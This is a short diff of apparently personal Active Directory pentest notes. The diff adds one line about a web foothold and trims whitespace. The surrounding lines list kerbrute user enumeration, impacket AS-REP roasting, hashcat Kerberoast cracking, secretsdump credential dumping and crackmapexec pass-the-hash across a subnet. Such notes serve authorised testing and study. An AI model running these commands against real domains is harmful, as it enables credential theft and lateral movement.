@@ -59,7 +59,8 @@
 4. `kerbrute userenum --dc $IP -d DOMAIN.NAME user.txt` user.txt is a userlist that we have created to authenticate to DC.
 5. `impacket-GetNPUsers -usersfile user.txt -dc-ip $IP DOMAIN.NAME/`
 6. Crack the hash
-## Web vulnerabiltities   
+## Web vulnerabiltities  
+1. Gain initial foothold via web vulnerability
 
 
 ## Getting users list
@@ -149,4 +150,4 @@ hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
 1. We have a user account and pssexed into an account. We want to dump hashes.
 2. `secretsdump.py Domain/USERNAME:SOMEPASSWORD@TargetIP`
 3. `crackmapexec smb $IP.0/24 -u "UserNmae" -H <Hash> --local-auth
-## Token Impersonation
+## Token Impersonation 
